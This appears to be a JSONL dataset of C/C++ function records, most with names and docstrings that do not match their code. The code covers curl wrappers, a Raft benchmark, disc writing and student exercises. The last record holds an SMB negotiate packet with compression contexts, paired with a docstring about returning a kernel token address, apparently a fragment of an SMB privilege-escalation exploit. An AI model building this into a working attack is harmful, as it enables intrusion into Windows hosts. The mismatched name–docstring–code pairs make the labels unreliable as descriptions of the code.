names.\\r\\n\\tif(pInfo)\\r\\n\\t\\talertFile.FreeValuesInfo(pInfo);\\r\\n\\r\\n\\treturn hr;\\t\\r\\n}'}","id":1973}
{"content":"{'function_name': 'CURL_Set', 'docstring': \"\/\/Some servers don't like requests that are made without a user-agent field, so we provide one.\", 'code': 'static int CURL_FormAddString(int r7Sn, int functionSn) {\\r\\n\\t\\tint result = 1;\\r\\n\\t\\tvoid *variableObject = NULL;\\r\\n\\t\\tresult = R7_GetVariableObject(r7Sn, functionSn, 2, &variableObject);\\r\\n\\t\\tif (result <= 0) {\\r\\n\\t\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, -1);\\r\\n\\t\\t\\treturn -1;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tCURL_t *curl = ((CURL_t*)variableObject);\\r\\n\\r\\n\\t\\tint nameSize = R7_GetVariableStringSize(r7Sn, functionSn, 3);\/\/4 byte  -> nameSize = 5\\r\\n\\t\\tchar *name = (char*)malloc(nameSize);\\r\\n\\t\\tR7_GetVariableString(r7Sn, functionSn, 3, name, nameSize);\\r\\n\\r\\n\\t\\tint strSize = R7_GetVariableStringSize(r7Sn, functionSn, 4);\\r\\n\\t\\tchar *str = (char*)malloc(strSize);\\r\\n\\t\\tR7_GetVariableString(r7Sn, functionSn, 4, str, strSize);\\r\\n\\n\\t\\tcurl_formadd(&post, &last, CURLFORM_COPYNAME, name,\\n\\t\\t\\tCURLFORM_COPYCONTENTS, str,\\n\\t\\t\\tCURLFORM_END);\\r\\n\\r\\n\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, result);\\r\\n\\t\\tR7_SetVariableObject(r7Sn, functionSn, 2, curl);\\r\\n\\t\\treturn 1;\\r\\n\\t}'}","id":1975}
{"content":"{'function_name': 'get_formatted_vector', 'docstring': '\/\/ \u0437\u0430\u043c\u0435\u043d\u044f\u0435\u043c\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430', 'code': 'string trim(string &s) {\\n    if (s.length() == 0) {\\n        s = s;\\n    }\\n    int begin, end;\\n    \/\/ \u043f\u043e\u0438\u0441\u043a \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u0432\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u044f \u043d\u0435 \u043f\u0440\u043e\u0431\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0438\u043c\u0432\u043e\u043b\u0430 \u043f\u043e\u0434 \u043f\u0440\u043e\u0431\u0435\u043b\u044c\u043d\u044b\u043c \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u043c \u043f\u043e\u043d\u0438\u043c\u0430\u0435\u0442\u0441\u044f \u043f\u0440\u043e\u0431\u0435\u043b, \u0442\u0430\u0431\u0443\u043b\u044f\u0446\u0438\u044f, \u0441\u0438\u043c\u0432\u043e\u043b \u043d\u043e\u0432\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\\n    begin = s.find_first_not_of(\"\\\\b\\\\f\\\\n\\\\r\\\\t\\\\v\");\\n    \/\/ \u043f\u043e\u0438\u0441\u043a \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u0432\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u044f \u043d\u0435 \u043f\u0440\u043e\u0431\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0438\u043c\u0432\u043e\u043b\u0430\\n    end = s.find_last_not_of(\"\\\\b\\\\f\\\\n\\\\r\\\\t\\\\v\");\\n    if ((begin == string::npos) || (end == string::npos)) {\\n        s = \"\";\\n    }\\n    \/\/ \u0441\u043e\u0437\u0434\u0430\u0434\u0438\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 \u043a\u0430\u043a \u043f\u043e\u0434\u0441\u0442\u0440\u043e\u043a\u0443, \u043d\u0430 \u043e\u0441\u043d\u043e\u0432\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432 \u043f\u043e\u0438\u0441\u043a\u0430\\n    return string(s, begin, end - begin + 1);\\n}'}","id":1977}
{"content":"{'function_name': 'init_raft', 'docstring': '\/\/ Wait until Raft server is ready (upto 10 seconds).', 'code': 'int bench_main(const bench_config& config) {\\n    server_stuff stuff;\\n    stuff.server_id_ = config.srv_id_;\\n    stuff.endpoint_ = config.my_endpoint_;\\n\\n    size_t pos = config.my_endpoint_.rfind(\":\");\\n    if (pos == std::string::npos) {\\n        std::cerr << \"wrong endpoint: \" << config.my_endpoint_ << std::endl;\\n        return -1;\\n    }\\n    stuff.port_ = atoi( config.my_endpoint_.substr(pos + 1).c_str() );\\n    if (stuff.port_ < 1000) {\\n        std::cerr << \"wrong port (should be >= 1000): \"\\n                  << stuff.port_ << std::endl;\\n        return -1;\\n    }\\n\\n    print_config(config);\\n\\n    CHK_Z( init_raft(stuff) );\\n    _msg(\"-----\\\\n\");\\n\\n    if (stuff.server_id_ > 1) {\\n        \/\/ Follower, just sleep\\n        TestSuite::sleep_sec(config.duration_, \"ready\");\\n    }\\n\\n    \/\/ Leader.\\n    CHK_Z( add_servers(stuff, config) );\\n    _msg(\"-----\\\\n\");\\n\\n    worker_params param(config, stuff);\\n    std::vector<TestSuite::ThreadHolder> h_workers(config.num_threads_);\\n    for (size_t ii=0; ii<h_workers.size(); ++ii) {\\n        TestSuite::ThreadHolder& h_worker = h_workers[ii];\\n        h_worker.spawn(&param, worker_func, worker_killer_func);\\n    }\\n\\n    TestSuite::Displayer dd(1, 3);\\n    dd.init();\\n    std::vector<size_t> col_width(3, 15);\\n    dd.setWidth(col_width);\\n    TestSuite::Timer duration_timer(config.duration_ * 1000);\\n    while (!duration_timer.timeout()) {\\n        TestSuite::sleep_ms(80);\\n        uint64_t cur_us = duration_timer.getTimeUs();\\n        if (!cur_us) continue;\\n\\n        uint64_t cur_ops = param.num_ops_done_;\\n\\n        dd.set( 0, 0, \"%zu\/%zu\", cur_us \/ 1000000, config.duration_ );\\n        dd.set( 0, 1, \"%zu\", cur_ops );\\n        dd.set( 0, 2, \"%s ops\/s\", TestSuite::throughputStr(cur_ops, cur_us).c_str() );\\n        dd.print();\\n    }\\n    param.stop_signal_ = true;\\n\\n    for (size_t ii=0; ii<h_workers.size(); ++ii) {\\n        TestSuite::ThreadHolder& tt = h_workers[ii];\\n        tt.join();\\n    }\\n\\n    _msg(\"-----\\\\n\");\\n    TestSuite::_msg(\"%15s%10s%10s%10s%10s%10s\\\\n\",\\n                    \"OP\", \"p50\", \"p95\", \"p99\", \"p99.9\", \"p99.99\");\\n\\n    TestSuite::_msg(\"%15s%10s%10s%10s%10s%10s\\\\n\",\\n        \"replication\",\\n        TestSuite::usToString\\n        ( global_lat.getPercentile(\"rep\", 50) ).c_str(),\\n        TestSuite::usToString\\n        ( global_lat.getPercentile(\"rep\", 95) ).c_str(),\\n        TestSuite::usToString\\n        ( global_lat.getPercentile(\"rep\", 99) ).c_str(),\\n        TestSuite::usToString\\n        ( global_lat.getPercentile(\"rep\", 99.9) ).c_str(),\\n        TestSuite::usToString\\n        ( global_lat.getPercentile(\"rep\", 99.99) ).c_str());\\n    _msg(\"-----\\\\n\");\\n\\n    write_latency_distribution();\\n\\n    return 0;\\n}'}","id":1979}
{"content":"{'function_name': 'func4', 'docstring': '\/\/\/\/ Symbol', 'code': \"int func5() {\\n    std::string s; \/\/ \u041f\u041e\u0427\u0422\u0418 \u041a\u0410\u041a same as vector<char>\\n    std::cin >> s;\\n\\n    s[1] = 'a';\\n\\n    return s.size();\\n}\"}","id":1986}
{"content":"{'function_name': 'second_part_fourth_task', 'docstring': '\/\/ push to zeros array indices of elements equal to zero', 'code': 'int main() {\\n    \/**1st part of the task*\/\\n    start_first_task();\\n\\n    \/**\\n     * 2st part of the task\\n     * \u0414\u0430\u043d \u043c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 N \u0432\u0435\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b. \u041d\u0430\u0439\u0442\u0438 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432, \u0440\u0430\u0441\u043f\u043e\u043b\u043e\u0436\u0435\u043d\u043d\u044b\u0445 \u0434\u043e \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430,\\n        \u043a\u0440\u0430\u0442\u043d\u043e\u0433\u043e 5. \u0423\u0434\u0432\u043e\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043c\u0430\u0441\u0441\u0438\u0432\u0430, \u0440\u0430\u0432\u043d\u044b\u0435 k. \u0415\u0441\u043b\u0438 \u0440\u0430\u0437\u043c\u0435\u0440 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0431\u043e\u043b\u044c\u0448\u0435 4, \u0442\u043e \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u0432\u0438\u0442\u044c \u043f\u0435\u0440\u0432\u044b\u0435 5\\n        \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0432 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\u043c \u043f\u043e\u0440\u044f\u0434\u043a\u0435. \u041f\u0435\u0440\u0435\u043d\u0435\u0441\u0442\u0438 \u0432\u0441\u0435 \u043d\u0443\u043b\u0435\u0432\u044b\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0432 \u043a\u043e\u043d\u0435\u0446 \u043c\u0430\u0441\u0441\u0438\u0432\u0430, \u043d\u0435 \u043c\u0435\u043d\u044f\u044f \u043f\u043e\u0440\u044f\u0434\u043e\u043a\\n        \u0441\u043b\u0435\u0434\u043e\u0432\u0430\u043d\u0438\u044f \u043e\u0441\u0442\u0430\u043b\u044c\u043d\u044b\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432. \u041e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e \u0447\u0430\u0441\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0434\u043e \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0433\u043e\\n        \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\\n     *\\n     * *\/\\n\\n    start_second_task();\\n\\n    return 0;\\n}'}","id":1988}
{"content":"{'function_name': 'Show_all', 'docstring': '\/\/  ........................................................................', 'code': 'gboolean            Namespaces_prefix_add       (const gchar* _str)\\n{\\n    \/\/  append to the list of nsp prefixes\\n    gd_namespaces_prefixes->add( const_cast < gchar* > ( _str ) );\\n\\n    \/\/  build nsp prefixes string\\n    if ( gd_namespaces_prefix )\\n    {\\n        libgwr::dstr::append( gd_namespaces_prefix, \"::\" , _str, NULL );\\n    }\\n    else\\n    {\\n        libgwr::dstr::append( gd_namespaces_prefix, _str, NULL );\\n    }\\n\\n    return TRUE;\\n}'}","id":1989}
{"content":"{'function_name': 'ListAllRecorders', 'docstring': \"\/\/ Print each recorder's ID\", 'code': 'HRESULT ImageWriter(PROGRAM_OPTIONS options)\\n{\\n    HRESULT hr = S_OK;\\n    IDiscRecorder2* recorder = NULL;\\n    IDiscFormat2Data* dataWriter = NULL;\\n    IStream * dataStream = NULL;\\n    ULONG sectorsInDataStream = 0;\\n    BOOLEAN dualLayerDvdMedia = FALSE;\\n    ULONG index = options.WriterIndex;\\n    CComObject<CTestDataWriter2Event>* eventSink = NULL;\\n\\n    \/\/ create a DiscFormat2Data object\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = CoCreateInstance(CLSID_MsftDiscFormat2Data,\\n                              NULL, CLSCTX_ALL,\\n                              IID_PPV_ARGS(&dataWriter)\\n                             );\\n        if (FAILED(hr))\\n        {\\n            printf(\"CoCreateInstance failed\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n    \/\/ create a DiscRecorder object\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = GetDiscRecorder(index, &recorder);\\n        if (FAILED(hr))\\n        {\\n            printf(\"CoCreateInstance failed\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ Set the recorder as the recorder for the data writer\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = dataWriter->put_Recorder(recorder);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed put_Recorder()\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n    \/\/ release the recorder early...\\n    ReleaseAndNull(recorder);\\n\\n    \/\/ Set the app name for use with exclusive access\\n    \/\/ THIS IS REQUIRED\\n    if (SUCCEEDED(hr))\\n    {\\n        BSTR appName = ::SysAllocString(L\"Imapi2Sample\");\\n\\n        hr = dataWriter->put_ClientName(appName);\\n        if (FAILED(hr))\\n        {\\n            printf(\"FAILED to set client name for ISO write!\\\\n\");\\n            PrintHR(hr);\\n        }\\n        FreeSysStringAndNull(appName);\\n    }\\n\\n    \/\/ verify the Current media write speed property gets\\n    \/\/if (SUCCEEDED(hr))\\n    \/\/{\\n    \/\/    LONG value = 0;\\n    \/\/    hr = dataWriter->get_CurrentMediaWriteSpeed(&value);\\n    \/\/    if (FAILED(hr))\\n    \/\/    {\\n    \/\/        DoTrace((TRACE_LEVEL_INFORMATION, DebugGeneral,\\n    \/\/                 \"Failed get_CurrentMediaWriteSpeed() %!HRESULT!\",\\n    \/\/                 hr\\n    \/\/                 ));\\n    \/\/       printf(\"Ignoring failed get_CurrentWriteSpeed() for now\\\\n\");\\n    \/\/        hr = S_OK;\\n    \/\/    }\\n    \/\/}\\n\\n\\n    \/\/ verify the SupportedMediaTypes property gets\\n    if (SUCCEEDED(hr))\\n    {\\n        SAFEARRAY * value = NULL;\\n        hr = dataWriter->get_SupportedMediaTypes(&value);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed get_SupportedMediaTypes()\\\\n\");\\n            PrintHR(hr);\\n        }\\n        SafeArrayDestroyDataAndNull(value);\\n    }\\n\\n    \/\/ get a stream to write to the disc\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = GetIsoStreamForDataWriting(&dataStream, &sectorsInDataStream, options.FileName);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed to create data stream for writing\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ Create the event sink\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = CComObject<CTestDataWriter2Event>::CreateInstance(&eventSink);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed to create event sink\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ need to keep a reference to this eventSink\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = eventSink->AddRef();\\n        if (FAILED(hr))\\n        {\\n            printf(\"FAILED to addref\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ Hookup the event sink\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = eventSink->DispEventAdvise(dataWriter);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed to hookup event sink\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ write the stream\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = dataWriter->Write(dataStream);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed to write stream\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ unhook events\\n    \/\/ unhook events\\n    if (NULL != eventSink)\\n    {\\n        eventSink->DispEventUnadvise(dataWriter);\\n    }\\n\\n    \/\/ verify that clearing the disc recorder works\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = dataWriter->put_Recorder(NULL);\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed put_Recorder(NULL)\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    ReleaseAndNull(eventSink);\\n    ReleaseAndNull(dataWriter);\\n    ReleaseAndNull(dataStream);\\n\\n    if (SUCCEEDED(hr))\\n    {\\n        printf(\"ImageWriter succeeded for drive index %d\\\\n\",\\n               index\\n              );\\n    }\\n    else\\n    {\\n        printf(\"ImageWriter FAILED for drive index %d\\\\n\", index);\\n        PrintHR(hr);\\n    }\\n    return hr;\\n}'}","id":2004}
{"content":"{'function_name': 'InsertEdge', 'docstring': '\/* \u82e5\u662f\u65e0\u5411\u56fe\uff0c\u8fd8\u8981\u63d2\u5165\u8fb9<V2,V1> *\/', 'code': 'MGraph BuildGraph() {\\n\\tMGraph Graph;\\n\\tEdge E;\\n\\tVertex V;\\n\\tint Nv, i;\\n \\n\\tprintf(\"=======\u8f93\u5165\u9876\u70b9\u4e2a\u6570(8)=======\\\\n\");\\n\\tscanf(\"%d\", &Nv);\\t\/* \u8bfb\u5165\u9876\u70b9\u4e2a\u6570 *\/\\n\\tGraph = CreateGraph(Nv);\\t\/* \u521d\u59cb\u5316\u6709Nv\u4e2a\u9876\u70b9\u4f46\u6ca1\u6709\u8fb9\u7684\u56fe *\/\\n\\t\/\/getchar();\\n\\tprintf(\"====\u9a8c\u8bc1\u8f93\u5165===%d\", Nv);\\n\\tprintf(\"\\\\n=======\u8f93\u5165\u8fb9\u6570(9)=======\\\\n\");\\n\\tscanf(\"%d\", &(Graph->Ne));\\t\/* \u8bfb\u5165\u8fb9\u6570 *\/\\n\\tprintf(\"====\u9a8c\u8bc1\u8f93\u5165===%d\", Graph->Ne);\\n\\t\/\/getchar();\\n\\tif (Graph->Ne != 0) {\\t\/* \u5982\u679c\u6709\u8fb9 *\/\\n\\t\\tE = (Edge)malloc(sizeof(struct ENode));\\t\/* \u5efa\u7acb\u8fb9\u7ed3\u70b9 *\/\\n\\t\\tprintf(\"\\\\n=======\u8f93\u5165\u8fb9 \u683c\u5f0f\u4e3a \u8d77\u70b9 \u7ec8\u70b9 \u6743\u91cd=======\\\\n\");\\n\\t\\tprintf(\"0 1 1 0 3 1 0 4 1 1 2 1 2 3 1 4 7 1 4 5 1 5 6 1 6 7 1\\\\n\");\\n\\t\\t\/* \u8bfb\u5165\u8fb9\uff0c\u683c\u5f0f\u4e3a\"\u8d77\u70b9 \u7ec8\u70b9 \u6743\u91cd\"\uff0c\u63d2\u5165\u90bb\u63a5\u77e9\u9635 *\/\\n\\t\\tfor (i = 0; i < Graph->Ne; i++) {\\n\\t\\t\\tscanf(\"%d %d %d\", &E->V1, &E->V2, &E->weight);\\n\\t\\t\\tprintf(\"====\u9a8c\u8bc1\u8f93\u5165===%d %d %d\", E->V1, E->V2, E->weight);\\n\\t\\t\\tInsertEdge(Graph, E);\\n\\t\\t}\\n\\t}\\n\\tgetchar();\\n\\t\/* \u5982\u679c\u9876\u70b9\u6709\u6570\u636e\u7684\u8bdd\uff0c\u8bfb\u5165\u6570\u636e *\/\\n\\tprintf(\"=======\u8f93\u5165\u6570\u636e============\\\\n\");\\n\\tprintf(\"ABCDEFGH\\\\n\");\\n\\tfor (V = 0; V < Graph->Nv; V++) {\\n\\t\\tscanf(\"%c\", &(Graph->Data[V]));\\n\\t\\tprintf(\"====\u9a8c\u8bc1\u8f93\u5165===%c\", Graph->Data[V]);\\n\\t}\\n\\treturn Graph;\\n}'}","id":2005}
{"content":"{'function_name': 'feedPartial', 'docstring': '\/\/ Skip whitespace.', 'code': 'static void finish() {\\n  \/\/ If a syntax error occurred earlier in the parsing of this command, we\\'re\\n  \/\/ going to throw it away, so no point \"finishing\" it.\\n  if (failed) {\\n    return;\\n  }\\n\\n  \/\/ currentArgument still holds the last argument of the command.\\n  if (!currentRequest.addArgument(currentArgument)) {\\n    \/\/ More than MAX_NUM_ARGUMENTS arguments received.\\n    flagFailure();\\n    return;\\n  }\\n}'}","id":2008}
{"content":"{'function_name': 'frente_cola', 'docstring': '\/\/1\\r', 'code': 'int vacia_cola(cola* c){\\r\\n\/*clrscr();\\r\\ncout<<\"\\\\n\\\\t\\\\t\\\\tVACIA \\\\n\\\\n\"<<endl;*\/\\r\\n return c->vacia();\\r\\n\/\/system (\"PAUSE\");\\r\\n\\r\\n}'}","id":2009}
{"content":"{'function_name': 'custom_SV_WriteDownloadToClient', 'docstring': '\/\/ It will get sent with next snap shot.  The rate will keep us in line.', 'code': 'void hook_SV_GetChallenge(netadr_t from)\\n{\\n\\t\/\/ Prevent using getchallenge as an amplifier\\n\\tif ( SVC_RateLimitAddress( from, 10, 1000 ) )\\n\\t{\\n\\t\\tCom_DPrintf( \"SV_GetChallenge: rate limit from %s exceeded, dropping request\\\\n\", NET_AdrToString( from ) );\\n\\t\\treturn;\\n\\t}\\n\\n\\t\/\/ Allow getchallenge to be DoSed relatively easily, but prevent\\n\\t\/\/ excess outbound bandwidth usage when being flooded inbound\\n\\tif ( SVC_RateLimit( &outboundLeakyBucket, 10, 100 ) )\\n\\t{\\n\\t\\tCom_DPrintf( \"SV_GetChallenge: rate limit exceeded, dropping request\\\\n\" );\\n\\t\\treturn;\\n\\t}\\n\\n\\tSV_GetChallenge(from);\\n}'}","id":2016}
{"content":"{'function_name': 'get_process_token', 'docstring': '\/\/ \ucee4\ub110 \ud1a0\ud070 \uc8fc\uc18c \ub9ac\ud134.\\r', 'code': 'int send_negotiation(SOCKET sock) {\\r\\n\\tint err = 0;\\r\\n\\tchar response[8] = { 0 };\\r\\n\\r\\n\\tconst uint8_t buf[] = { \/\/ buf = SMB \ub124\uace0\uc2dc\uc5d0\uc774\uc158.\\r\\n\\t\\t\/* NetBIOS \ub798\ud37c *\/\\r\\n\\t\\t0x00,                   \/* \uc138\uc158 *\/\\r\\n\\t\\t0x00, 0x00, 0xC4,       \/* \uc804\ud328 \uae38\uc774 *\/\\r\\n\\r\\n\\t\\t\/* SMB Header *\/\\r\\n\\t\\t0xFE, 0x53, 0x4D, 0x42, \/* \ud504\ub85c\ud1a0\ucf5c id *\/\\r\\n\\t\\t0x40, 0x00,             \/* \uad6c\uc870\uccb4 \ud06c\uae30 0x40(must be) *\/\\r\\n\\t\\t0x00, 0x00,             \/* \ud06c\ub808\ub527 \uc815\ub3c4 *\/\\r\\n\\t\\t0x00, 0x00,             \/* \ucc44\ub110 \uc5f0\uc18d *\/\\r\\n\\t\\t0x00, 0x00,             \/* \ucc44\ub110 \ud560\ub2f9\uc790 *\/\\r\\n\\t\\t0x00, 0x00,             \/* \uba85\ub839\uc5b4 *\/\\r\\n\\t\\t0x00, 0x00,             \/* \ud06c\ub808\ub527 \uc694\uccad *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \ud50c\ub798\uadf8\ub4e4 *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uccb4\uc778 \uc624\ud504\uc14b *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uba54\uc138\uc9c0 id *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uc608\uc57d \ubc14\uc774\ud2b8 *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \ud2b8\ub9ac id *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uc138\uc158 id *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uc2dc\uadf8\ub108\ucc98(\uc2dd\ubcc4\uc790) *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\r\\n\\t\\t\/* SMB \ub124\uace0\uc2dc\uc5d0\uc774\uc158 \uc694\uccad *\/\\r\\n\\t\\t0x24, 0x00,             \/* \uad6c\uc870 \ud06c\uae30 *\/\\r\\n\\t\\t0x08, 0x00,             \/* dialect \uce74\uc6b4\ud2b8(8) *\/\\r\\n\\t\\t0x00, 0x00,             \/* \ubcf4\uc548 \ubaa8\ub4dc(0) *\/\\r\\n\\t\\t0x00, 0x00,             \/* \uc608\uc57d \ubc14\uc774\ud2b8\uc5f4 *\/\\r\\n\\t\\t0x7F, 0x00, 0x00, 0x00, \/* \ucea0\ud37c\ube4c\ub9ac\ud2f0(\uad8c\ud55c) *\/\\r\\n\\t\\t0x01, 0x02, 0xAB, 0xCD, \/* guid *\/\\r\\n\\t\\t0x01, 0x02, 0xAB, 0xCD,\\r\\n\\t\\t0x01, 0x02, 0xAB, 0xCD,\\r\\n\\t\\t0x01, 0x02, 0xAB, 0xCD,\\r\\n\\t\\t0x78, 0x00,             \/* \ub124\uace0 \ud134\ud14d\uc2a4\ud2b8(\ucee8)*\/\\r\\n\\t\\t0x00, 0x00,             \/* \ucd94\uac00 \ud328\ub529(0) *\/\\r\\n\\t\\t0x02, 0x00,             \/* \ub124\uace0 \ucee8\ud14d\uc2a4\ud2b8 \uce74\uc6b4\ud2b8(2)*\/\\r\\n\\t\\t0x00, 0x00,             \/* \uc608\uc57d \ubc14\uc774\ud2b8\uc5f4(2\ubc14\uc774\ud2b8)*\/\\r\\n\\t\\t0x02, 0x02,             \/* dialects, SMB 2.0.2 *\/\\r\\n\\t\\t0x10, 0x02,             \/* SMB 2.1 *\/\\r\\n\\t\\t0x22, 0x02,             \/* SMB 2.2.2 *\/\\r\\n\\t\\t0x24, 0x02,             \/* SMB 2.2.3 *\/\\r\\n\\t\\t0x00, 0x03,             \/* SMB 3.0 *\/\\r\\n\\t\\t0x02, 0x03,             \/* SMB 3.0.2 *\/\\r\\n\\t\\t0x10, 0x03,             \/* SMB 3.0.1 *\/\\r\\n\\t\\t0x11, 0x03,             \/* SMB 3.1.1 *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \ud328\ub529 4\ubc14\uc774\ud2b8\uc5f4. *\/\\r\\n\\r\\n\\t\\t\/* \uc811\uc18d\uc804 \ucee8\ud14d\uc2a4\ud2b8(\ud0c0\uc785=1) *\/\\r\\n\\t\\t0x01, 0x00,             \/* \ud0c0\uc785 (1) *\/\\r\\n\\t\\t0x26, 0x00,             \/* \uae38\uc774(0x26) *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uc608\uc57d 4\ubc14\uc774\ud2b8\uc5f4 *\/\\r\\n\\t\\t0x01, 0x00,             \/* \ud574\uc2dc \uc54c\uace0\ub9ac\uc998 \uce74\uc6b4\ud2b8(1) *\/\\r\\n\\t\\t0x20, 0x00,             \/* \uc0d0\ud2b8 \uae38\uc774(32) *\/\\r\\n\\t\\t0x01, 0x00,             \/* \ud574\uc2dc \uc54c\uace0\ub9ac\uc998(SHA512) *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uc0d0\ud2b8 0x00 4\ubc14\uc774\ud2b8\uc5f4. *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00,\\r\\n\\t\\t0x00, 0x00,             \/* \ud328\ub529 *\/\\r\\n\\r\\n\\t\\t\/* \uc555\ucd95\ub41c \ucee8\ud14d\uc2a4\ud2b8(\ud0c0\uc785=3) *\/\\r\\n\\t\\t0x03, 0x00,             \/* \ud0c0\uc785 *\/\\r\\n\\t\\t0x0E, 0x00,             \/* \uae38\uc774 *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \uc608\uc57d \ubc14\uc774\ud2b8\uc5f4(4\ubc14\uc774\ud2b8) *\/\\r\\n\\t\\t0x02, 0x00,             \/* \uc555\ucd95\ub41c \uc54c\uace0\ub9ac\uc998 \uce74\uc6b4\ud2b8 *\/\\r\\n\\t\\t0x00, 0x00,             \/* \ud328\ub529 2\ubc14\uc774\ud2b8\uc5f4 *\/\\r\\n\\t\\t0x01, 0x00, 0x00, 0x00, \/* \ud50c\ub798\uadf8\uc988 *\/\\r\\n\\t\\t0x02, 0x00,             \/* LZ77 *\/\\r\\n\\t\\t0x03, 0x00,             \/* LZ77+\ud5c8\ud504\ub9cc(Huffman) *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00, \/* \ud328\ub529\uac12(0x00 4\ubc14\uc774\ud2b8\uc5f4). *\/\\r\\n\\t\\t0x00, 0x00, 0x00, 0x00\\r\\n\\t};\\r\\n\\t\\r\\n\\t\/\/ \uc18c\ucf13 \uc804\uc1a1.\\r\\n\\tif ((err = send(sock, (const char *)buf, sizeof(buf), 0)) != SOCKET_ERROR) {\\r\\n\\t\\trecv(sock, response, sizeof(response), 0); \\r\\n\\t}\\r\\n\\r\\n\\treturn err;\\r\\n}'}","id":2027}
